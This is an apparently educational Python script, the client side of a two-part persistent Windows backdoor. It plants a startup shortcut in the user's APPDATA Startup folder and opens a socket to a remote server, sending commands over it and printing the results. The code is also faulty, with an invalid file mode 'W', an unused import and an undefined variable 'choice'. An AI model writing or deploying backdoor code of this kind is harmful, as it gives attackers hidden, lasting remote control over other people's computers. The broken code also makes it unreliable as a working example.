# Created November 12th, 2025
# Created by Ari LeFebre
# This script was created for educational purposes, and is not intended to be used maliciously.
# The creation of this script was heavily influenced by a script created by Devon Griffith.

# This script is one of two scripts designed to establish a persistent backdoor.
# This script is for the client-side.



# Import Statements
from imaplib import Commands
import socket
import os

# Define function that adds persistence
def create_startup_entry():
    # Path to the startup directory
    startup_path = os.path.join(os.environ["APPDATA"], "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
    backdoor_path = os.path.abspath(__file__)
    shortcut_path = os.path.join(startup_path, "backdoor.lnk") # backdoor.lnk is the link to the backdoor

    with open(shortcut_path, "W") as shortcut:
        shortcut.write(
            f'[InternetShortcut]\nURL=file://{backdoor_path}\n'
        )

# Define function that creates the backdoor and allows it to accept remote commands.
def backdoor(client_socket):
    while True:
        command = input("Enter a command to execute (or 'exit' to quit): ")
        client_socket.send(command.encode())
        if command.lower() == "exit":
            break
        result = client_socket.recv(4096).decode()
        # Server returns the results of commands.
        print("Result:\n", result)

# Define main function
def main():
    server_ip = "" # Replace with the server's IP before executing.
    server_port = 1234 # Replace with desired port.

    # Create the socket
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((server_ip, server_port))

    # Keep connection persistent
    while True:
        # Make a hidden startup file
        create_startup_entry()
        # Open the backdoor
        backdoor(client_socket)
        if choice.lower() == "exit":

            client_socket.close()

if __name__ == "__main__":
    main()
